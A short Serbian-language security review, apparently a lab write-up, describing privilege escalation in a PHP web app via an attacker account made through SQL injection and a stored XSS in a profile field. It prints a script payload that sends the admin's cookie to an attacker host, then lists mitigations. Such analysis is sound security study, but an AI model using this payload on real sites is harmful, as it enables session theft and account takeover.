# Bezbednosni pregled koda i analiza

## Zaobilaženje mehanizma autentikacije

## Eskalacija privilegija do administratorskog nivoa

Analizom koda za autorizaciju, primećeno je da se proverava samo da li je username korisnika admin. Budući da nema provere dupliranih username, uspešno smo kreirali nalog napadača pomoću SQL injekcije. Zbog diversifikacije, za metod eskalacije privilegija je ipak izabran XSS u vidu skripte koja bi se učitala samo u podacima koje vidi administrator - u tabeli korisnika. Svi korisnici mogu da ažuriraju opis svog profila pri čemu ne postoji validacija unosa. Kasnije se ti podaci koriste na nesiguran način prilikom učitavanja tabele pri čemu dolazi do **persisted XSS** ranjivosti.

```html
<script>fetch(`http://{attacker_host}:{port}/${{document.cookie}}`);</script>
```

*Exploit* sadrži jedan zahtev ka adresi napadača u kom se šalju *Cookies* koji sadrže **PHPSESSID** admina. Potom se ovaj *session id* koristi u novoj sesiji sa administratorskim pravima. Ranjivost je mogla da bude sprečena zaštitom od XSS (validacija unosa i bezbedno rukovanje ispisom vrednosti) ili sigurnom konfiguracijom *Cookies* sa ograničenjima za slanje samo preko *https* i zabranom pristupa polju *cookie* iz *JavaScript-a*.

## Izvršenje proizvoljnog koda na serveru

